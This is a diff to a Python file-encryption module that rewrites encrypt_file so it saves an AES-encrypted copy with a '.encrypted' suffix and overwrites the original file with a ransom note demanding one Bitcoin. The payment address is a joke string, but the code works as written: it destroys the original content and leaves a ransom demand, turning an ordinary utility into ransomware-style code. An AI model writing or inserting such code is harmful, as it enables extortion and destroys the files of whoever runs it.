@@ -70,23 +70,31 @@ def decrypt_data(encrypted_data: bytes, key: bytes, iv: bytes) -> bytes:
 
 def encrypt_file(file_path: str, key: bytes, iv: bytes) -> None:
     """
-    Encrypts the file at the given file path.
-    
-    Inputs:
-      - file_path: Path to the file to encrypt.
-      - key: AES encryption key as bytes.
-      - iv: Initialization vector (IV) as bytes.
-    
-    Process:
-      1. Read the file contents as binary.
-      2. Encrypt the data.
-      3. Write the encrypted data back to the file.
+    Encrypt the file at the given file path, save the encrypted data to a backup file,
+    and then replace the original file's content with a ransom note.
     """
+    # Read the original file in binary mode
     with open(file_path, 'rb') as file:
         data = file.read()
+    
+    # Encrypt the data (using your existing encrypt_data function)
     encrypted = encrypt_data(data, key, iv)
-    with open(file_path, 'wb') as file:
+    
+    # Save the encrypted data to a backup file (e.g., append .encrypted to the filename)
+    backup_file = file_path + ".encrypted"
+    with open(backup_file, 'wb') as file:
         file.write(encrypted)
+    
+    # Overwrite the original file with a ransom note (in text mode)
+    ransom_note = (
+        "YOUR FILES HAVE BEEN ENCRYPTED!\n\n"
+        "To recover your files, send 1 Bitcoin to the following address:\n"
+        "Daniel-is-super-awesome!!!\n\n"
+        "Then run the decryption tool and enter your decryption key and IV.\n"
+        "Failure to do so will result in permanent data loss."
+    )
+    with open(file_path, 'w') as file:
+        file.write(ransom_note)
 
 def decrypt_file(file_path: str, key: bytes, iv: bytes) -> None:
     """
